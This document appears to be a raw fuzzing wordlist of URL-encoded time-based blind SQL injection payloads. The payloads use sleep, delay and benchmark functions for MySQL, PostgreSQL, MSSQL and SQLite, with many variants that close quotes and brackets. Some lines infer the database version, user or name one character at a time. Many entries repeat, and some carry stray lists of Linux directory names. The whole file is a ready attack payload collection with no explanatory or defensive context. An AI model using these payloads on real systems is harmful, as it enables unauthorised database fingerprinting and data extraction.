+AND+%28SELECT+a.txt+b.txt+FROM+%28SELECT%28SLEEP%285%29%29%29YjoC%29+AND+%27%25%27%3d%27%0a
+AND+%28SELECT+a.txt+b.txt+FROM+%28SELECT%28SLEEP%285%29%29%29nQIP%29%0a
+AND+%28SELECT+a.txt+b.txt+FROM+%28SELECT%28SLEEP%285%29%29%29nQIP%29--%0a
+AND+%28SELECT+a.txt+b.txt+FROM+%28SELECT%28SLEEP%285%29%29%29nQIP%29%23%0a
+SLEEP%285%29%23%0a
+SLEEP%285%29--%0a
+SLEEP%285%29%3d"%0a
+SLEEP%285%29%3d%27%0a
+or+SLEEP%285%29%0a
+or+SLEEP%285%29%23%0a
+or+SLEEP%285%29--%0a
+or+SLEEP%285%29%3d"%0a
+or+SLEEP%285%29%3d%27%0a
+waitfor+delay+%2700%3a00%3a05%27%0a
+waitfor+delay+%2700%3a00%3a05%27--%0a
+waitfor+delay+%2700%3a00%3a05%27%23%0a
+benchmark%2850000000%2cMD5%281%29%29%0a
+benchmark%2850000000%2cMD5%281%29%29--%0a
+benchmark%2850000000%2cMD5%281%29%29%23%0a
+or+benchmark%2850000000%2cMD5%281%29%29%0a
+or+benchmark%2850000000%2cMD5%281%29%29--%0a
+or+benchmark%2850000000%2cMD5%281%29%29%23%0a
+pg_SLEEP%285%29%0a
+pg_SLEEP%285%29--%0a
+pg_SLEEP%285%29%23%0a
+or+pg_SLEEP%285%29%0a
+or+pg_SLEEP%285%29--%0a
+or+pg_SLEEP%285%29%23%0a
+%27"%0a
+AnD+SLEEP%285%29%0a
+AnD+SLEEP%285%29--%0a
+AnD+SLEEP%285%29%23%0a
+%26%26SLEEP%285%29%0a
+%26%26SLEEP%285%29--%0a
+%26%26SLEEP%285%29%23%0a
+%27+AnD+SLEEP%285%29+ANd+%271%0a
+%27%26%26SLEEP%285%29%26%26%271%0a
+ORDER+BY+SLEEP%285%29%0a
+ORDER+BY+SLEEP%285%29--%0a
+ORDER+BY+SLEEP%285%29%23%0a
+%28SELECT+a.txt+b.txt+FROM+%28SELECT%28SLEEP%285%29%29%29ecMj%29%0a
+%28SELECT+a.txt+b.txt+FROM+%28SELECT%28SLEEP%285%29%29%29ecMj%29%23%0a
+%28SELECT+a.txt+b.txt+FROM+%28SELECT%28SLEEP%285%29%29%29ecMj%29--%0a
+%2bbenchmark%283200%2cSHA1%281%29%29%2b%27%0a
+%2b+SLEEP%2810%29+%2b+%27%0a
+RANDOMBLOB%28500000000%2f2%29%0a
+AND+2947%3dLIKE%28%27ABCDEFG%27%2cUPPER%28HEX%28RANDOMBLOB%28500000000%2f2%29%29%29%29%0a
+OR+2947%3dLIKE%28%27ABCDEFG%27%2cUPPER%28HEX%28RANDOMBLOB%28500000000%2f2%29%29%29%29%0a
+RANDOMBLOB%281000000000%2f2%29%0a
+AND+2947%3dLIKE%28%27ABCDEFG%27%2cUPPER%28HEX%28RANDOMBLOB%281000000000%2f2%29%29%29%29%0a
+OR+2947%3dLIKE%28%27ABCDEFG%27%2cUPPER%28HEX%28RANDOMBLOB%281000000000%2f2%29%29%29%29%0a
+SLEEP%281%29%2f%2a%27+or+SLEEP%281%29+or+%27"+or+SLEEP%281%29+or+"%2a%2f%0a
+waitfor+delay+%270%3a0%3a20%27+%2fbin+%2fboot+%2fdev+%2fetc+%2fhome+%2finit+%2flib+%2flib64+%2flost%2bfound+%2fmnt+%2fopt+%2fproc+%2fREADME+%2froot+%2frun+%2fsbin+%2fsrv+%2fsys+%2ftmp+%2fusr+%2fvar%0a
+waitfor+delay+%270%3a0%3a20%27+--%0a
+%27+waitfor+delay+%270%3a0%3a20%27+%2fbin+%2fboot+%2fdev+%2fetc+%2fhome+%2finit+%2flib+%2flib64+%2flost%2bfound+%2fmnt+%2fopt+%2fproc+%2fREADME+%2froot+%2frun+%2fsbin+%2fsrv+%2fsys+%2ftmp+%2fusr+%2fvar%0a
+%27+waitfor+delay+%270%3a0%3a20%27+--%0a
+"+waitfor+delay+%270%3a0%3a20%27+%2fbin+%2fboot+%2fdev+%2fetc+%2fhome+%2finit+%2flib+%2flib64+%2flost%2bfound+%2fmnt+%2fopt+%2fproc+%2fREADME+%2froot+%2frun+%2fsbin+%2fsrv+%2fsys+%2ftmp+%2fusr+%2fvar%0a
+"+waitfor+delay+%270%3a0%3a20%27+--%0a
+%29+waitfor+delay+%270%3a0%3a20%27+%2fbin+%2fboot+%2fdev+%2fetc+%2fhome+%2finit+%2flib+%2flib64+%2flost%2bfound+%2fmnt+%2fopt+%2fproc+%2fREADME+%2froot+%2frun+%2fsbin+%2fsrv+%2fsys+%2ftmp+%2fusr+%2fvar%0a
+%29+waitfor+delay+%270%3a0%3a20%27+--%0a
+%29%29+waitfor+delay+%270%3a0%3a20%27+%2fbin+%2fboot+%2fdev+%2fetc+%2fhome+%2finit+%2flib+%2flib64+%2flost%2bfound+%2fmnt+%2fopt+%2fproc+%2fREADME+%2froot+%2frun+%2fsbin+%2fsrv+%2fsys+%2ftmp+%2fusr+%2fvar%0a
+%29%29+waitfor+delay+%270%3a0%3a20%27+--%0a
+%29%29%29+waitfor+delay+%270%3a0%3a20%27+%2fbin+%2fboot+%2fdev+%2fetc+%2fhome+%2finit+%2flib+%2flib64+%2flost%2bfound+%2fmnt+%2fopt+%2fproc+%2fREADME+%2froot+%2frun+%2fsbin+%2fsrv+%2fsys+%2ftmp+%2fusr+%2fvar%0a
+%29%29%29+waitfor+delay+%270%3a0%3a20%27+--%0a
+%29%29%29%29+waitfor+delay+%270%3a0%3a20%27+%2fbin+%2fboot+%2fdev+%2fetc+%2fhome+%2finit+%2flib+%2flib64+%2flost%2bfound+%2fmnt+%2fopt+%2fproc+%2fREADME+%2froot+%2frun+%2fsbin+%2fsrv+%2fsys+%2ftmp+%2fusr+%2fvar%0a
+%29%29%29%29+waitfor+delay+%270%3a0%3a20%27+--%0a
+%29%29%29%29%29+waitfor+delay+%270%3a0%3a20%27+--%0a
+%29%29%29%29%29%29+waitfor+delay+%270%3a0%3a20%27+--%0a
+%27%29+waitfor+delay+%270%3a0%3a20%27+%2fbin+%2fboot+%2fdev+%2fetc+%2fhome+%2finit+%2flib+%2flib64+%2flost%2bfound+%2fmnt+%2fopt+%2fproc+%2fREADME+%2froot+%2frun+%2fsbin+%2fsrv+%2fsys+%2ftmp+%2fusr+%2fvar%0a
+%27%29+waitfor+delay+%270%3a0%3a20%27+--%0a
+"%29+waitfor+delay+%270%3a0%3a20%27+%2fbin+%2fboot+%2fdev+%2fetc+%2fhome+%2finit+%2flib+%2flib64+%2flost%2bfound+%2fmnt+%2fopt+%2fproc+%2fREADME+%2froot+%2frun+%2fsbin+%2fsrv+%2fsys+%2ftmp+%2fusr+%2fvar%0a
+"%29+waitfor+delay+%270%3a0%3a20%27+--%0a
+%27%29%29+waitfor+delay+%270%3a0%3a20%27+%2fbin+%2fboot+%2fdev+%2fetc+%2fhome+%2finit+%2flib+%2flib64+%2flost%2bfound+%2fmnt+%2fopt+%2fproc+%2fREADME+%2froot+%2frun+%2fsbin+%2fsrv+%2fsys+%2ftmp+%2fusr+%2fvar%0a
+%27%29%29+waitfor+delay+%270%3a0%3a20%27+--%0a
+"%29%29+waitfor+delay+%270%3a0%3a20%27+%2fbin+%2fboot+%2fdev+%2fetc+%2fhome+%2finit+%2flib+%2flib64+%2flost%2bfound+%2fmnt+%2fopt+%2fproc+%2fREADME+%2froot+%2frun+%2fsbin+%2fsrv+%2fsys+%2ftmp+%2fusr+%2fvar%0a
+"%29%29+waitfor+delay+%270%3a0%3a20%27+--%0a
+%27%29%29%29+waitfor+delay+%270%3a0%3a20%27+%2fbin+%2fboot+%2fdev+%2fetc+%2fhome+%2finit+%2flib+%2flib64+%2flost%2bfound+%2fmnt+%2fopt+%2fproc+%2fREADME+%2froot+%2frun+%2fsbin+%2fsrv+%2fsys+%2ftmp+%2fusr+%2fvar%0a
+%27%29%29%29+waitfor+delay+%270%3a0%3a20%27+--%0a
+"%29%29%29+waitfor+delay+%270%3a0%3a20%27+%2fbin+%2fboot+%2fdev+%2fetc+%2fhome+%2finit+%2flib+%2flib64+%2flost%2bfound+%2fmnt+%2fopt+%2fproc+%2fREADME+%2froot+%2frun+%2fsbin+%2fsrv+%2fsys+%2ftmp+%2fusr+%2fvar%0a
+"%29%29%29+waitfor+delay+%270%3a0%3a20%27+--%0a
+%27%29%29%29%29+waitfor+delay+%270%3a0%3a20%27+%2fbin+%2fboot+%2fdev+%2fetc+%2fhome+%2finit+%2flib+%2flib64+%2flost%2bfound+%2fmnt+%2fopt+%2fproc+%2fREADME+%2froot+%2frun+%2fsbin+%2fsrv+%2fsys+%2ftmp+%2fusr+%2fvar%0a
+%27%29%29%29%29+waitfor+delay+%270%3a0%3a20%27+--%0a
+"%29%29%29%29+waitfor+delay+%270%3a0%3a20%27+%2fbin+%2fboot+%2fdev+%2fetc+%2fhome+%2finit+%2flib+%2flib64+%2flost%2bfound+%2fmnt+%2fopt+%2fproc+%2fREADME+%2froot+%2frun+%2fsbin+%2fsrv+%2fsys+%2ftmp+%2fusr+%2fvar%0a
+"%29%29%29%29+waitfor+delay+%270%3a0%3a20%27+--%0a
+%27%29%29%29%29%29+waitfor+delay+%270%3a0%3a20%27+%2fbin+%2fboot+%2fdev+%2fetc+%2fhome+%2finit+%2flib+%2flib64+%2flost%2bfound+%2fmnt+%2fopt+%2fproc+%2fREADME+%2froot+%2frun+%2fsbin+%2fsrv+%2fsys+%2ftmp+%2fusr+%2fvar%0a
+%27%29%29%29%29%29+waitfor+delay+%270%3a0%3a20%27+--%0a
+"%29%29%29%29%29+waitfor+delay+%270%3a0%3a20%27+%2fbin+%2fboot+%2fdev+%2fetc+%2fhome+%2finit+%2flib+%2flib64+%2flost%2bfound+%2fmnt+%2fopt+%2fproc+%2fREADME+%2froot+%2frun+%2fsbin+%2fsrv+%2fsys+%2ftmp+%2fusr+%2fvar%0a
+"%29%29%29%29%29+waitfor+delay+%270%3a0%3a20%27+--%0a
+%27%29%29%29%29%29%29+waitfor+delay+%270%3a0%3a20%27+%2fbin+%2fboot+%2fdev+%2fetc+%2fhome+%2finit+%2flib+%2flib64+%2flost%2bfound+%2fmnt+%2fopt+%2fproc+%2fREADME+%2froot+%2frun+%2fsbin+%2fsrv+%2fsys+%2ftmp+%2fusr+%2fvar%0a
+%27%29%29%29%29%29%29+waitfor+delay+%270%3a0%3a20%27+--%0a
+"%29%29%29%29%29%29+waitfor+delay+%270%3a0%3a20%27+%2fbin+%2fboot+%2fdev+%2fetc+%2fhome+%2finit+%2flib+%2flib64+%2flost%2bfound+%2fmnt+%2fopt+%2fproc+%2fREADME+%2froot+%2frun+%2fsbin+%2fsrv+%2fsys+%2ftmp+%2fusr+%2fvar%0a
+"%29%29%29%29%29%29+waitfor+delay+%270%3a0%3a20%27+--%0a
+1%27%3b%2bwaitfor%2bdelay%2b%270%3a0%3a5%27%2b-%2b%0a
+%27%2bAND%2b%28SELECT%2b6377%2bFROM%2b%28SELECT%28SLEEP%285%29%29%29hLTl%29--%0a
+%27%2bWAITFOR%2bDELAY%2b%270%3a0%3a5%27--%0a
+%27%3bWAITFOR%2bDELAY%2b%270%3a0%3a5%27--%0a
+%27%29%29%2bor%2bsleep%285%29%3d%27%0a
+%3bwaitfor%2bdelay%2b%270%3a0%3a5%27--%0a
+%29%3bwaitfor%2bdelay%2b%270%3a0%3a5%27--%0a
+%27%3bwaitfor%2bdelay%2b%270%3a0%3a5%27--%0a
+"%3bwaitfor%2bdelay%2b%270%3a0%3a5%27--%0a
+%27%29%3bwaitfor%2bdelay%2b%270%3a0%3a5%27--%0a
+"%29%3bwaitfor%2bdelay%2b%270%3a0%3a5%27--%0a
+%27XOR%28if%28now%28%29%3dsysdate%28%29%2csleep%285%2a5%29%2c0%29%29OR%27%2b%0a
+%27XOR%28if%28now%28%29%3dsysdate%28%29%2csleep%285%2a5%2a0%29%2c0%29%29OR%27%0a
+%27XOR%28if%28now%28%29%3dsysdate%28%29%2csleep%286%2a6-30%29%2c0%29%29OR%27%2b%0a
+%27xor%28if%28now%28%29%3dsysdate%28%29%2csleep%2810%29%2c0%29%29or%27%0a
+%2bor%2bsleep%280.000000001%29%0a
+%2bAND%2bSLEEP%2815%29%0a
+%2520AND%2520SLEEP%2815%29%0a
+%252c%28select%2afrom%28select%28sleep%2830%29%29%29a%29%0a
+-sleep%285%29%0a
+-benchmark%281000000000%2c1-1%29%2b%0a
+%27%252b%28select%2afrom%28select%28sleep%282%29%29%29a%29%252b%27%0a
+%27%2b%28select%2afrom%28select%28sleep%282%29%29%29a%29%2b%27%0a
+%27%252bIF%28MID%28%40%40version%2c1%2c1%29%3d4%2csleep%282%29%2c1%29%3d2%252b%27%0a
+%27%2bIF%28MID%28%40%40version%2c1%2c1%29%3d4%2csleep%282%29%2c1%29%3d2%2b%27%0a
+%28select%280%29from%28select%28sleep%2825%29%29%29v%29%0a
+-sleep%2f%2af%2a%2f%2810%29%0a
+-if%28mid%28version%2f%2af%2a%2f%28%29%2c1%2c1%29%3d5%2csleep%2f%2af%2a%2f%285%29%2c0%0a
+-if%28mid%28version%2f%2af%2a%2f%28%29%2c1%2c1%29%3d4%2csleep%2f%2af%2a%2f%285%29%2c0%29%0a
+%27%3bSELECT%2b1%3bSELECT%2bpg_sleep%2830%29%3b--%27%0a
+%2527%253BSELECT%25201%253BSELECT%2520pg_sleep%2830%29%253B--%2527%0a
+AND%2bSLEEP%287%29%23%2b%2c%2b%2520AND%2520SLEEP%287%29%2523%0a
+%2bAND%2bSLEEP%287%29%23%0a
+%2520SLEEP%287%29%2523%0a
+SELECT%2b%2aFROM%2b%28SELECT%28SLEEP%285%29%29%29a%29%0a
+%27%3dsleep%2810%29%3d%271%0a
+%27%3dIF%28MID%28VERSION%28%29%2c1%2c1%29%3d1%2cSLEEP%2810%29%2c0%29%3d%271%0a
+%27%3dIF%28MID%28VERSION%28%29%2c1%2c1%29%3d5%2cSLEEP%2810%29%2c0%29%3d%271%0a
+%28select%2afrom%28select%28sleep%285%29%29%29a%29%0a
+SLEEP%2825%29%0a
+%2bor%2b1%253d%28%28SELECT%2b1%2bFROM%2b%28SELECT%2bSLEEP%2825%29%29A%29%29%0a
+%2bor%2b1%3d%28%28SELECT%2b1%2bFROM%2b%28SELECT%2bSLEEP%2825%29%29A%29%29%0a
+%27%252b%28select%2afrom%28select%28sleep%283%29%29%29a%29%252b%27%0a
+%27%252b%28select%2afrom%28select%28sleep%280%29%29%29a%29%252b%0a
+%27%2bor%2bsleep%285%29%2b%23%2b%0a
+%2f%2a%27XOR%28if%282%3d2%2csleep%2810%29%2c0%29%29OR%27%0a
+%2520AND%2520%28SELECT%2520%2a%2520FROM%2520%28SELECT%28SLEEP%281%29%29%29WUeh%29%0a
+if%28now%28%29%3dsysdate%28%29%2csleep%2810%29%2c0%29%2f%27XOR%28if%28now%28%29%3dsysdate%28%29%2csleep%2810%29%2c0%29%29OR%27"XOR%28if%28now%28%29%3dsysdate%28%29%2csleep%2810%29%2c0%29%2band%2b1%3d1%29"%2f%0a
+AND%2b%28SELECT%2b%2aFROM%2b%28SELECT%28SLEEP%281%29%29%29WUeh%29%0a
+pg_sleep%2830%29--%0a
+%252c%28select%2afrom%28select%28sleep%2830%29%29%29a%29%2b%2b%0a
+-CASE%2f%2a%2a%2fWHEN%28LENGTH%28version%28%29%29%3d10%29THEN%28SLEEP%286%2a1%29%29END%26city_id%3d0%0a
+%29%29%3bwaitfor%2bdelay%2b%270%3a0%3a5%27--%0a
+"%3bwaitfor%2bdelay%2b%270%3a0%3a__TIME_%0a
+%3bwaitfor%2bdelay%2b%270%3a0%3a__TIME__%27--%0a
+"%29%3bwaitfor%2bdelay%2b%270%3a0%3a__TIME__%27--%0a
+%27%2520and%2520%28select%2520%2a%2520from%2520%28select%28if%28substring%28user%28%29%2c1%2c1%29%3d%27p%27%2csleep%285%29%2c1%29%29%29a%29--%2520%3b%0a
+%27%252bbenchmark%2810000000%252csha1%281%29%29%252b%27%0a
+%27%252%2520and%2520%2bif%28substring%28user%28%29%2c1%2c1%29%3d%27c%27%2cSLEEP%283%29%2c1%29%252b%27%0a
+"%29%29%2bor%2bsleep%28__TIME__%29%3d"%0a
+"%29%2bor%2bpg_sleep%28__TIME__%29--%0a
+1%2bor%2bpg_sleep%28__TIME__%29--%0a
+%29%29%2bor%2bpg_sleep%28__TIME__%29--%0a
+1%29%29%2bor%2bsleep%28__TIME__%29%23%0a
+%29%29%2bor%2bsleep%28__TIME__%29%3d%27%0a
+"%29%29%2bor%2bpg_sleep%28__TIME__%29--%0a
+%27%29%29%2bor%2bsleep%285%29%3d%27%0a
+%3bwaitfor%2bdelay%2b%270%3a0%3a5%27--%0a
+%29%3bwaitfor%2bdelay%2b%270%3a0%3a5%27--%0a
+%27%3bwaitfor%2bdelay%2b%270%3a0%3a5%27--%0a
+"%3bwaitfor%2bdelay%2b%270%3a0%3a5%27--%0a
+%27%29%3bwaitfor%2bdelay%2b%270%3a0%3a5%27--%0a
+"%29%3bwaitfor%2bdelay%2b%270%3a0%3a5%27--%0a
+%29%29%3bwaitfor%2bdelay%2b%270%3a0%3a5%27--%0a
+"%2bor%2bsleep%28__TIME__%29%23%0a
+pg_sleep%28__TIME__%29--%0a
+1%29%2bor%2bsleep%28__TIME__%29%23%0a
+1%2bwaitfor%2bdelay%2b%270%3a0%3a10%27--%0a
+%29%29%3bwaitfor%2bdelay%2b%270%3a0%3a__TIME__%27--%0a
+a%27%2bwaitfor%2bdelay%2b%270%3a0%3a10%27--%0a
+1%2bor%2bsleep%28__TIME__%29%23%0a
+"%2bor%2bpg_sleep%28__TIME__%29--%0a
+%2520%27sleep%252050%27%0a
+1%29%29%2bor%2bpg_sleep%28__TIME__%29--%0a
+or%2bsleep%28__TIME__%29%3d%27%0a
+%2bor%2bpg_sleep%28__TIME__%29--%0a
+"%29%2bor%2bsleep%28__TIME__%29%3d"%0a
+%29%2bor%2bpg_sleep%28__TIME__%29--%0a
+or%2bsleep%28__TIME__%29%23%0a
+%27XOR%28if%28now%28%29%3dsysdate%28%29%2csleep%285%2a5%29%2c0%29%29OR%27%0a
+%27XOR%28if%28now%28%29%3dsysdate%28%29%2csleep%285%2a5%2a0%29%2c0%29%29OR%27%2b%0a
+%27XOR%28if%28now%28%29%3dsysdate%28%29%2csleep%286%2a6-30%29%2c0%29%29OR%27%0a
+%2bor%2bsleep%280.000000001%29%0a
+%2520AND%2520SLEEP%285%29%2b%0a
+-CASE%2f%2a%2a%2fWHEN%28LENGTH%28version%28%29%29%3d10%29THEN%28SLEEP%286%2a1%29%29%0a
+%252c%28select%2afrom%28select%28sleep%2830%29%29%29%0a
+-sleep%285%29%2b%0a
+%27%252bIF%28MID%28%40%40version%2c1%2c1%29%3d4%2csleep%282%29%2c1%29%3d2%252b%27%0a
+%27%252b%28select%2afrom%28select%28sleep%282%29%29%29a%29%252b%27%0a
+pg_sleep%2830%29--%0a
+%28select%280%29from%28select%28sleep%2825%29%29%29v%29%2b%0a
+-sleep%2f%2af%2a%2f%2810%29%0a
+-if%28mid%28version%2f%2af%2a%2f%28%29%2c1%2c1%29%3d5%2csleep%2f%2af%2a%2f%285%29%2c0%29%2b%0a
+%27%3bSELECT%2b1%3bSELECT%2bpg_sleep%2830%29%3b--%27%0a
+%2520AND%2520SLEEP%287%29%2523%0a
+%28SELECT%2b%2aFROM%2b%28SELECT%28SLEEP%285%29%29%29a%29%0a
+%27xor%28if%28now%28%29%3dsysdate%28%29%2csleep%2810%29%2c0%29%29or%27%0a
+%27xor%28if%28mid%28database%28%29%2c1%2c1%29%3d0x41%2csleep%2863%29%2c0%29%29or%27%2b%0a
+%2bor%2bsleep%280.000000001%29%0a
+%2520AND%2520SLEEP%2815%29%0a
+-CASE%2f%2a%2a%2fWHEN%28LENGTH%28version%28%29%29%3d10%29THEN%28SLEEP%286%2a1%29%29%0a
+%252c%28select%2afrom%28select%28sleep%2830%29%29%29a%29%0a
+sleep%285%29%23%0a
+1%2bor%2bsleep%285%29%23%0a
+"%2bor%2bsleep%285%29%23%0a
+%27%2bor%2bsleep%285%29%23%0a
+"%2bor%2bsleep%285%29%3d"%0a
+%27%2bor%2bsleep%285%29%3d%27%0a
+1%29%2bor%2bsleep%285%29%23%0a
+"%29%2bor%2bsleep%285%29%3d"%0a
+%27%29%2bor%2bsleep%285%29%3d%27%0a
+1%29%29%2bor%2bsleep%285%29%23%0a
+"%29%29%2bor%2bsleep%285%29%3d"%0a
+%27%29%29%2bor%2bsleep%285%29%3d%27%0a
+%3bwaitfor%2bdelay%2b%270%3a0%3a5%27--%0a
+%29%3bwaitfor%2bdelay%2b%270%3a0%3a5%27--%0a
+%27%3bwaitfor%2bdelay%2b%270%3a0%3a5%27--%0a
+"%3bwaitfor%2bdelay%2b%270%3a0%3a5%27--%0a
+%27%29%3bwaitfor%2bdelay%2b%270%3a0%3a5%27--%0a
+"%29%3bwaitfor%2bdelay%2b%270%3a0%3a5%27--%0a
+%29%29%3bwaitfor%2bdelay%2b%270%3a0%3a5%27--%0a
+%27%29%29%3bwaitfor%2bdelay%2b%270%3a0%3a5%27--%0a
+"%29%29%3bwaitfor%2bdelay%2b%270%3a0%3a5%27--%0a
+benchmark%2810000000%2cMD5%281%29%29%23%0a
+1%2bor%2bbenchmark%2810000000%2cMD5%281%29%29%23%0a
+"%2bor%2bbenchmark%2810000000%2cMD5%281%29%29%23%0a
+%27%2bor%2bbenchmark%2810000000%2cMD5%281%29%29%23%0a
+1%29%2bor%2bbenchmark%2810000000%2cMD5%281%29%29%23%0a
+"%29%2bor%2bbenchmark%2810000000%2cMD5%281%29%29%23%0a
+%27%29%2bor%2bbenchmark%2810000000%2cMD5%281%29%29%23%0a
+1%29%29%2bor%2bbenchmark%2810000000%2cMD5%281%29%29%23%0a
+"%29%29%2bor%2bbenchmark%2810000000%2cMD5%281%29%29%23%0a
+%27%29%29%2bor%2bbenchmark%2810000000%2cMD5%281%29%29%23%0a
+pg_sleep%285%29--%0a
+1%2bor%2bpg_sleep%285%29--%0a
+"%2bor%2bpg_sleep%285%29--%0a
+%27%2bor%2bpg_sleep%285%29--%0a
+1%29%2bor%2bpg_sleep%285%29--%0a
+"%29%2bor%2bpg_sleep%285%29--%0a
+%27%29%2bor%2bpg_sleep%285%29--%0a
+1%29%29%2bor%2bpg_sleep%285%29--%0a
+"%29%29%2bor%2bpg_sleep%285%29--%0a
+%27%29%29%2bor%2bpg_sleep%285%29--%0a
+AND%2b%28SELECT%2b%2aFROM%2b%28SELECT%28SLEEP%285%29%29%29bAKL%29%2bAND%2b%27vRxe%27%3d%27vRxe%0a
+AND%2b%28SELECT%2b%2aFROM%2b%28SELECT%28SLEEP%285%29%29%29YjoC%29%2bAND%2b%27%25%27%3d%27%0a
+AND%2b%28SELECT%2b%2aFROM%2b%28SELECT%28SLEEP%285%29%29%29nQIP%29%0a
+AND%2b%28SELECT%2b%2aFROM%2b%28SELECT%28SLEEP%285%29%29%29nQIP%29--%0a
+AND%2b%28SELECT%2b%2aFROM%2b%28SELECT%28SLEEP%285%29%29%29nQIP%29%23%0a
+SLEEP%285%29%23%0a
+SLEEP%285%29--%0a
+SLEEP%285%29%3d"%0a
+SLEEP%285%29%3d%27%0a
+or%2bSLEEP%285%29%0a
+or%2bSLEEP%285%29%23%0a
+or%2bSLEEP%285%29--%0a
+or%2bSLEEP%285%29%3d"%0a
+or%2bSLEEP%285%29%3d%27%0a
+waitfor%2bdelay%2b%2700%3a00%3a05%27%0a
+waitfor%2bdelay%2b%2700%3a00%3a05%27--%0a
+waitfor%2bdelay%2b%2700%3a00%3a05%27%23%0a
+benchmark%2850000000%2cMD5%281%29%29%0a
+benchmark%2850000000%2cMD5%281%29%29--%0a
+benchmark%2850000000%2cMD5%281%29%29%23%0a
+or%2bbenchmark%2850000000%2cMD5%281%29%29%0a
+or%2bbenchmark%2850000000%2cMD5%281%29%29--%0a
+or%2bbenchmark%2850000000%2cMD5%281%29%29%23%0a
+pg_SLEEP%285%29%0a
+pg_SLEEP%285%29--%0a
+pg_SLEEP%285%29%23%0a
+or%2bpg_SLEEP%285%29%0a
+or%2bpg_SLEEP%285%29--%0a
+or%2bpg_SLEEP%285%29%23%0a
+%27"%0a
+AnD%2bSLEEP%285%29%0a
+AnD%2bSLEEP%285%29--%0a
+AnD%2bSLEEP%285%29%23%0a
+%26%26SLEEP%285%29%0a
+%26%26SLEEP%285%29--%0a
+%26%26SLEEP%285%29%23%0a
+%27%2bAnD%2bSLEEP%285%29%2bANd%2b%271%0a
+%27%26%26SLEEP%285%29%26%26%271%0a
+ORDER%2bBY%2bSLEEP%285%29%0a
+ORDER%2bBY%2bSLEEP%285%29--%0a
+ORDER%2bBY%2bSLEEP%285%29%23%0a
+%28SELECT%2b%2aFROM%2b%28SELECT%28SLEEP%285%29%29%29ecMj%29%0a
+%28SELECT%2b%2aFROM%2b%28SELECT%28SLEEP%285%29%29%29ecMj%29%23%0a
+%28SELECT%2b%2aFROM%2b%28SELECT%28SLEEP%285%29%29%29ecMj%29--%0a
+%2bbenchmark%283200%2cSHA1%281%29%29%2b%27%0a
+%2b%2bSLEEP%2810%29%2b%2b%2b%27%0a
+RANDOMBLOB%28500000000%2f2%29%0a
+AND%2b2947%3dLIKE%28%27ABCDEFG%27%2cUPPER%28HEX%28RANDOMBLOB%28500000000%2f2%29%29%29%29%0a
+OR%2b2947%3dLIKE%28%27ABCDEFG%27%2cUPPER%28HEX%28RANDOMBLOB%28500000000%2f2%29%29%29%29%0a
+RANDOMBLOB%281000000000%2f2%29%0a
+AND%2b2947%3dLIKE%28%27ABCDEFG%27%2cUPPER%28HEX%28RANDOMBLOB%281000000000%2f2%29%29%29%29%0a
+OR%2b2947%3dLIKE%28%27ABCDEFG%27%2cUPPER%28HEX%28RANDOMBLOB%281000000000%2f2%29%29%29%29%0a
+SLEEP%281%29%2f%2a%27%2bor%2bSLEEP%281%29%2bor%2b%27"%2bor%2bSLEEP%281%29%2bor%2b"%2a%2f%0a
+sleep%285%29%23%0a
+1%2bor%2bsleep%285%29%23%0a
+"%2bor%2bsleep%285%29%23%0a
+%27%2bor%2bsleep%285%29%23%0a
+"%2bor%2bsleep%285%29%3d"%0a
+%27%2bor%2bsleep%285%29%3d%27%0a
+1%29%2bor%2bsleep%285%29%23%0a
+"%29%2bor%2bsleep%285%29%3d"%0a
+%27%29%2bor%2bsleep%285%29%3d%27%0a
+1%29%29%2bor%2bsleep%285%29%23%0a
+"%29%29%2bor%2bsleep%285%29%3d"%0a
+%27%29%29%2bor%2bsleep%285%29%3d%27%0a
+%3bwaitfor%2bdelay%2b%270%3a0%3a5%27--%0a
+%29%3bwaitfor%2bdelay%2b%270%3a0%3a5%27--%0a
+%27%3bwaitfor%2bdelay%2b%270%3a0%3a5%27--%0a
+"%3bwaitfor%2bdelay%2b%270%3a0%3a5%27--%0a
+%27%29%3bwaitfor%2bdelay%2b%270%3a0%3a5%27--%0a
+"%29%3bwaitfor%2bdelay%2b%270%3a0%3a5%27--%0a
+%29%29%3bwaitfor%2bdelay%2b%270%3a0%3a5%27--%0a
+%27%29%29%3bwaitfor%2bdelay%2b%270%3a0%3a5%27--%0a
+"%29%29%3bwaitfor%2bdelay%2b%270%3a0%3a5%27--%0a
+benchmark%2810000000%2cMD5%281%29%29%23%0a
+1%2bor%2bbenchmark%2810000000%2cMD5%281%29%29%23%0a
+"%2bor%2bbenchmark%2810000000%2cMD5%281%29%29%23%0a
+%27%2bor%2bbenchmark%2810000000%2cMD5%281%29%29%23%0a
+1%29%2bor%2bbenchmark%2810000000%2cMD5%281%29%29%23%0a
+"%29%2bor%2bbenchmark%2810000000%2cMD5%281%29%29%23%0a
+%27%29%2bor%2bbenchmark%2810000000%2cMD5%281%29%29%23%0a
+1%29%29%2bor%2bbenchmark%2810000000%2cMD5%281%29%29%23%0a
+"%29%29%2bor%2bbenchmark%2810000000%2cMD5%281%29%29%23%0a
+%27%29%29%2bor%2bbenchmark%2810000000%2cMD5%281%29%29%23%0a
+pg_sleep%285%29--%0a
+1%2bor%2bpg_sleep%285%29--%0a
+"%2bor%2bpg_sleep%285%29--%0a
+%27%2bor%2bpg_sleep%285%29--%0a
+1%29%2bor%2bpg_sleep%285%29--%0a
+"%29%2bor%2bpg_sleep%285%29--%0a
+%27%29%2bor%2bpg_sleep%285%29--%0a
+1%29%29%2bor%2bpg_sleep%285%29--%0a
+"%29%29%2bor%2bpg_sleep%285%29--%0a
+%27%29%29%2bor%2bpg_sleep%285%29--%0a
+AND%2b%28SELECT%2b%2aFROM%2b%28SELECT%28SLEEP%285%29%29%29bAKL%29%2bAND%2b%27vRxe%27%3d%27vRxe%0a
+AND%2b%28SELECT%2b%2aFROM%2b%28SELECT%28SLEEP%285%29%29%29YjoC%29%2bAND%2b%27%25%27%3d%27%0a
+AND%2b%28SELECT%2b%2aFROM%2b%28SELECT%28SLEEP%285%29%29%29nQIP%29%0a
+AND%2b%28SELECT%2b%2aFROM%2b%28SELECT%28SLEEP%285%29%29%29nQIP%29--%0a
+AND%2b%28SELECT%2b%2aFROM%2b%28SELECT%28SLEEP%285%29%29%29nQIP%29%23%0a
+SLEEP%285%29%23%0a
+SLEEP%285%29--%0a
+SLEEP%285%29%3d"%0a
+SLEEP%285%29%3d%27%0a
+or%2bSLEEP%285%29%0a
+or%2bSLEEP%285%29%23%0a
+or%2bSLEEP%285%29--%0a
+or%2bSLEEP%285%29%3d"%0a
+or%2bSLEEP%285%29%3d%27%0a
+waitfor%2bdelay%2b%2700%3a00%3a05%27%0a
+waitfor%2bdelay%2b%2700%3a00%3a05%27--%0a
